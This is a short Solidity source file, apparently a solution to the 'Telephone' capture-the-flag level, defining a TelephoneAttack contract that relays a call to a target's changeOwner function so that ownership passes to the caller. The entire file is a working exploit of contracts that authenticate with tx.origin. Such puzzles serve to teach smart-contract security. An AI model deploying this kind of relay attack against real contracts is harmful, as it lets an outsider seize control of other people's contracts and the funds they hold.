//SPDX-License-Identifier: UNLICENSED

pragma solidity >=0.7.0 <0.9.0;

import "./2_Owner.sol";

contract Telephone {
    function changeOwner(address _owner) public { }
}

contract TelephoneAttack is Owner {

    Telephone telephoneContract;

    function setTelephoneContract(address _contract) external isOwner {
        telephoneContract = Telephone(_contract);
    }

    function attackTelephoneContract () external isOwner {
        telephoneContract.changeOwner(msg.sender);
    }

}